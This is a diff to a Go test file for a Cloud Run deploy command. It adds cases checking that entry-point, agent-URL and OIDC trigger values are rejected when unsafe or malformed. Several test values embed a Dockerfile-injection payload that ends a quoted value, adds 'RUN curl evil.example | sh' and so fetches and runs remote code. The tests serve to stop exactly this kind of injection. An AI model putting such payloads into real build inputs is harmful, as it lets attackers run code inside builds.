@@ -161,13 +161,34 @@ func TestComputeFlags_RejectsWhitespaceInExecFile(t *testing.T) {
 // os.MkdirTemp with the two validators, and an entry point path with no ".go"
 // suffix is the only way to reach it.
 func TestComputeFlags_RejectionLeavesNoTempDir(t *testing.T) {
-	for name, payload := range map[string]struct{ entryPoint, agentURL string }{
-		"unsafe entry point": {"main\"\nRUN curl evil.example | sh\n#.go", "http://127.0.0.1:8081"},
-		"unsafe a2a url":     {"main.go", "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#"},
-		"no .go extension":   {"main", "http://127.0.0.1:8081"},
+	for name, payload := range map[string]struct {
+		entryPoint, agentURL string
+		set                  func(*deployCloudRunFlags)
+	}{
+		"unsafe entry point": {"main\"\nRUN curl evil.example | sh\n#.go", "http://127.0.0.1:8081", nil},
+		"unsafe a2a url":     {"main.go", "http://127.0.0.1:8081\"]\nRUN curl evil.example | sh\n#", nil},
+		"no .go extension":   {"main", "http://127.0.0.1:8081", nil},
+		"unsafe oidc value": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
+			setValidTriggerOIDCPairs(f)
+			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "x\"]\nRUN curl evil.example | sh\n#"
+		}},
+		"lone oidc flag": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
+			f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
+		}},
+		"padded oidc audience": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
+			setValidTriggerOIDCPairs(f)
+			f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app "
+		}},
+		"empty oidc service account entry": {"main.go", "http://127.0.0.1:8081", func(f *deployCloudRunFlags) {
+			setValidTriggerOIDCPairs(f)
+			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com,"
+		}},
 	} {
 		t.Run(name, func(t *testing.T) {
 			resetFlags(t, payload.entryPoint, payload.agentURL)
+			if payload.set != nil {
+				payload.set(&flags)
+			}
 			parent := flags.build.tempDir
 
 			if err := flags.computeFlags(); err == nil {
@@ -402,6 +423,18 @@ func TestPrepareDockerfile_OmitsUnsetTriggerOIDCFlags(t *testing.T) {
 	}
 }
 
+// dockerfileRejection is the part of the ValidateDockerfileSafe rejection
+// message that no other check in computeFlags produces.
+const dockerfileRejection = "not allowed in a value embedded in generated Dockerfile content"
+
+// setValidTriggerOIDCPairs sets a valid OIDC pair on both triggers.
+func setValidTriggerOIDCPairs(f *deployCloudRunFlags) {
+	f.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app"
+	f.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
+	f.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
+	f.cloudRun.eventarcTrigger.oidcServiceAccounts = "b@p.iam.gserviceaccount.com"
+}
+
 func TestComputeFlags_RejectsUnsafeTriggerOIDCValues(t *testing.T) {
 	const payload = `x"]` + "\nRUN curl evil.example | sh\n#"
 	for _, tc := range []struct {
@@ -415,14 +448,17 @@ func TestComputeFlags_RejectsUnsafeTriggerOIDCValues(t *testing.T) {
 	} {
 		t.Run(tc.flag, func(t *testing.T) {
 			resetFlags(t, "main.go", "http://127.0.0.1:8081")
+			// Complete pairs, so the both-or-neither check cannot answer for
+			// the Dockerfile check.
+			setValidTriggerOIDCPairs(&flags)
 			tc.set(&flags)
 
 			err := flags.computeFlags()
 			if err == nil {
 				t.Fatalf("computeFlags() = nil, want an error rejecting the unsafe %s value", tc.flag)
 			}
-			if !strings.Contains(err.Error(), tc.flag) {
-				t.Errorf("computeFlags() error = %v, want it to mention %s", err, tc.flag)
+			if !strings.Contains(err.Error(), tc.flag) || !strings.Contains(err.Error(), dockerfileRejection) {
+				t.Errorf("computeFlags() error = %v, want the Dockerfile-safety rejection of %s", err, tc.flag)
 			}
 		})
 	}
@@ -458,12 +494,47 @@ func TestComputeFlags_RejectsLoneTriggerOIDCFlag(t *testing.T) {
 	}
 }
 
+// Each of these passes the Dockerfile check and the pair check, and the
+// sublauncher refuses it when the container starts.
+func TestComputeFlags_RejectsTriggerOIDCValuesTheSublauncherRefuses(t *testing.T) {
+	for _, tc := range []struct {
+		name string
+		set  func(*deployCloudRunFlags)
+		want string
+	}{
+		{"pubsub audience with trailing space", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app " }, "--pubsub_oidc_audience"},
+		{"eventarc audience with leading space", func(f *deployCloudRunFlags) { f.cloudRun.eventarcTrigger.oidcAudience = " https://svc.run.app" }, "--eventarc_oidc_audience"},
+		{"pubsub trailing comma", func(f *deployCloudRunFlags) {
+			f.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com,"
+		}, "--pubsub_oidc_service_accounts"},
+		{"eventarc blank middle entry", func(f *deployCloudRunFlags) {
+			f.cloudRun.eventarcTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com, ,b@p.iam.gserviceaccount.com"
+		}, "--eventarc_oidc_service_accounts"},
+		{"pubsub only a space", func(f *deployCloudRunFlags) { f.cloudRun.pubsubTrigger.oidcServiceAccounts = " " }, "--pubsub_oidc_service_accounts"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			resetFlags(t, "main.go", "http://127.0.0.1:8081")
+			setValidTriggerOIDCPairs(&flags)
+			tc.set(&flags)
+
+			err := flags.computeFlags()
+			if err == nil {
+				t.Fatal("computeFlags() = nil, want an error")
+			}
+			if !strings.Contains(err.Error(), tc.want) {
+				t.Errorf("computeFlags() error = %v, want it to name %s", err, tc.want)
+			}
+		})
+	}
+}
+
 func TestComputeFlags_AcceptsCompleteTriggerOIDCPairs(t *testing.T) {
 	resetFlags(t, "main.go", "http://127.0.0.1:8081")
 	flags.cloudRun.pubsubTrigger.oidcAudience = "https://svc.run.app"
 	flags.cloudRun.pubsubTrigger.oidcServiceAccounts = "a@p.iam.gserviceaccount.com"
 	flags.cloudRun.eventarcTrigger.oidcAudience = "https://svc.run.app"
-	flags.cloudRun.eventarcTrigger.oidcServiceAccounts = "b@p.iam.gserviceaccount.com"
+	// The sublauncher trims each entry, so spaces around one are fine.
+	flags.cloudRun.eventarcTrigger.oidcServiceAccounts = "b@p.iam.gserviceaccount.com , c@p.iam.gserviceaccount.com"
 
 	if err := flags.computeFlags(); err != nil {
 		t.Errorf("computeFlags() = %v, want no error", err)
